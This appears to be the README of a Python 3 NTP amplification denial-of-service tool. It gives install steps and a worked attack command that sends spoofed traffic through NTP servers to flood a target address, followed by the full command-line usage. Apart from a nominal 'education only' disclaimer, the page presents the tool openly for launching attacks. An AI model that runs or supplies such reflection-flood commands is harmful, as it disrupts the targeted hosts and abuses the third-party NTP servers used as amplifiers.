# NTP DoS

An NTP DoS script rewritten from vpnguy-zz's ntpdos script using Python 3.

**This script is for education purpose only. Please do not use it for any other purposes. The author does not assume any responsibilities for abusive uses of this script.**

## Installation

```shell
# clone the repository
https://github.com/k4yt3x/ntpdos.git

# enter the repository directory
cd ntpdos/src

# install dependencies
pip3 install -U -r requirements.txt
```

## Launching Attacks

This following command launches an attack against `10.0.0.1` using NTP servers `192.168.0.1` and `ntp.example.com` with 100 packets sent to each of the NTP servers.

```shell
python3 ntpdos.py -t 10.0.0.1 -n 192.168.0.1 -n ntp.example.com -c 100
```

## Full Usages

```console
usage: ntpdos [-h] -t TARGET -n NTP_SERVER [-c COUNT]

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        address of the target host (default: None)
  -n NTP_SERVER, --ntp_server NTP_SERVER
                        address of NTP servers (default: None)
  -c COUNT, --count COUNT
                        number of packets to send with each of the NTP servers
                        (default: None)
```
